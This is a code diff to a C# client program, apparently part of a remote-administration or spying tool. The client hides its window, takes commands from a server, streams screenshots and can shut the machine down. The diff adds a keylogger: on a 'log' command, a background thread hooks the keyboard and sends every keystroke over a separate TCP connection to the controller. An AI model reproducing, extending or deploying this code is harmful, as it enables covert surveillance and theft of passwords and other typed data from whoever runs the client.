@@ -15,20 +15,25 @@ using System.Threading;
 using System.Drawing.Imaging;
 using System.Runtime.Serialization.Formatters.Binary;
 
+using Keystroke.API;
+
 namespace Client
 {
     public partial class Client : Form
     {
         private static ManualResetEvent mre = new ManualResetEvent(false);
-        private readonly TcpClient signalclient = new TcpClient();
-        private readonly TcpClient dataclient = new TcpClient();
-        private NetworkStream dataStream;
+        private readonly TcpClient signalClient = new TcpClient();
+        private readonly TcpClient screenClient = new TcpClient();
+        private NetworkStream screenStream;
         private NetworkStream signalStream;
 
         private Thread ConnectServer;
         private Thread ShareScreen;
         bool stopsharing = false;
         string secret = "@#%^*&*)&*()*)(*)(*)"; // Initialize random char
+
+        TcpClient logClient = new TcpClient();
+        NetworkStream logStream;
         public Client()
         {
             CheckForIllegalCrossThreadCalls = false;
@@ -42,11 +47,11 @@ namespace Client
         void TakeCommandFromServer()
         {
             this.Hide();
-            while (signalclient.Connected)
+            while (signalClient.Connected)
             {
                 try
                 {
-                    signalStream = signalclient.GetStream();
+                    signalStream = signalClient.GetStream();
 
                     //MessageBox.Show("Client said hello");
                     byte[] data = new byte[1024];
@@ -58,7 +63,7 @@ namespace Client
                         signal = Encoding.ASCII.GetString(data, 0, numBytesRead);
                         command = signal.Substring(0, signal.IndexOf('$'));
 
-                        //dataStream = dataclient.GetStream();
+                        //screenStream = screenClient.GetStream();
                         if (command.StartsWith("secret"))
                         {
                             String[] separator = { ":" };
@@ -99,6 +104,12 @@ namespace Client
                             String[] separator = { "shutdown" };
                             String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                             Shutdown(arg);
+                        }
+                        if (command.StartsWith("log"))
+                        {
+                            Thread Keylog = new Thread(Keylogger);
+                            Keylog.IsBackground = true;
+                            Keylog.Start();
                         }
 
                     }
@@ -142,12 +153,12 @@ namespace Client
         {
             try
             {
-                while(signalclient.Connected && ShareScreen.IsAlive)
+                while(signalClient.Connected && ShareScreen.IsAlive)
                 {
                     if (stopsharing) mre.WaitOne();
                 BinaryFormatter binaryFormatter = new BinaryFormatter();
-                dataStream = dataclient.GetStream();
-                binaryFormatter.Serialize(dataStream, GrabDesktop());
+                screenStream = screenClient.GetStream();
+                binaryFormatter.Serialize(screenStream, GrabDesktop());
                 //Thread.Sleep(100);
                 }
             }
@@ -158,6 +169,31 @@ namespace Client
 
 
 
+        }
+
+        private void sendKey(object key)
+        {
+            string msg = key.ToString();
+            Byte[] sendBytes = Encoding.UTF8.GetBytes(msg);
+            logStream.Write(sendBytes, 0, sendBytes.Length);
+        }
+        private void Keylogger()
+        {
+            try
+            {
+              
+                logStream = logClient.GetStream();
+                while (logClient.Connected)
+                {
+                    var api = new KeystrokeAPI();
+                    api.CreateKeyboardHook((character) => { sendKey(character); });
+                    Application.Run();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
         }
         private void Client_Load(object sender, EventArgs e)
         {
@@ -175,8 +211,9 @@ namespace Client
             //MessageBox.Show(dpiX.ToString() + "  " + dpiY.ToString());
 
 
-            signalclient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
-            dataclient.Connect(IPAddress.Parse("127.0.0.1"), 8081);
+            signalClient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
+            screenClient.Connect(IPAddress.Parse("127.0.0.1"), 8081);
+            logClient.Connect(IPAddress.Parse("127.0.0.1"), 8082);
 
             ConnectServer = new Thread(TakeCommandFromServer);
             ConnectServer.IsBackground = true;
@@ -197,7 +234,5 @@ namespace Client
                 MessageBox.Show("Bạn đã nhập mật khẩu sai ! ", " Lỗi");
             }
         }
-
-
     }
 }
